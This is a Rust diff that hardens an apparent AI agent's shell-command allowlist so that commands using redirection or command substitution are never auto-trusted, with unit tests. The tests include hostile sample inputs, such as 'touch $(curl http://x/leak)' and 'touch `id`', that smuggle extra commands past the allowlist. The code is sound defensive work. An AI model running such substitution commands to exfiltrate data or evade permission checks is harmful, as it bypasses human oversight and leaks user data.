@@ -252,6 +252,20 @@ pub fn safety_notes(command: &str) -> Vec<SafetyNote> {
     notes.notes
 }
 
+/// True if a command contains shell redirection or command substitution (`>`,
+/// `<`, `` ` ``, `$(`). These smuggle work past a per-program allowlist: a
+/// substitution runs an arbitrary program (`touch $(curl …)`) and a redirection
+/// writes a path the named program never mentions (`sed … > cfg`), so a command
+/// containing either must never be auto-trusted. Shared by the auto-trust path
+/// and the accept-edits allowlist so both refuse it identically.
+#[must_use]
+pub(crate) fn has_redirection_or_substitution(command: &str) -> bool {
+    command.contains('>')
+        || command.contains('<')
+        || command.contains('`')
+        || command.contains("$(")
+}
+
 /// cc-style `acceptEdits` allowlist for shell/job commands: filesystem-mutation
 /// programs that stay inside the workspace. Every segment's program must be in
 /// the set AND no positional path may escape the workspace (absolute, `~`, or
@@ -260,6 +274,11 @@ pub fn safety_notes(command: &str) -> Vec<SafetyNote> {
 #[must_use]
 pub fn is_workspace_fs_edit(command: &str) -> bool {
     const FS_EDIT: &[&str] = &["mkdir", "touch", "mv", "cp", "rm", "rmdir", "sed"];
+    // Redirection/substitution can run programs or write paths this per-segment
+    // program check never inspects, so such a command is never a bounded edit.
+    if has_redirection_or_substitution(command) {
+        return false;
+    }
     let segs = segments(command);
     if segs.is_empty() {
         return false;
@@ -324,6 +343,20 @@ mod tests {
     fn env_prefixed_sudo_is_denied() {
         assert!(denied("FOO=bar sudo reboot"));
         assert!(denied("/usr/bin/sudo rm x"));
+    }
+
+    #[test]
+    fn workspace_fs_edit_rejects_substitution_and_redirection() {
+        // Bounded in-workspace edits still qualify.
+        assert!(is_workspace_fs_edit("mkdir src/new"));
+        assert!(is_workspace_fs_edit("mv a.txt b.txt"));
+        // Command substitution runs an arbitrary program the allowlist never
+        // inspects (SSRF/exfil/local-exec), so it must NOT be auto-approvable.
+        assert!(!is_workspace_fs_edit("touch $(curl http://x/leak)"));
+        assert!(!is_workspace_fs_edit("cp a.txt $(whoami)"));
+        assert!(!is_workspace_fs_edit("touch `id`"));
+        // Redirection can write a path the named program never mentions.
+        assert!(!is_workspace_fs_edit("sed -i s/a/b/ f > cfg"));
     }
 
     #[test]
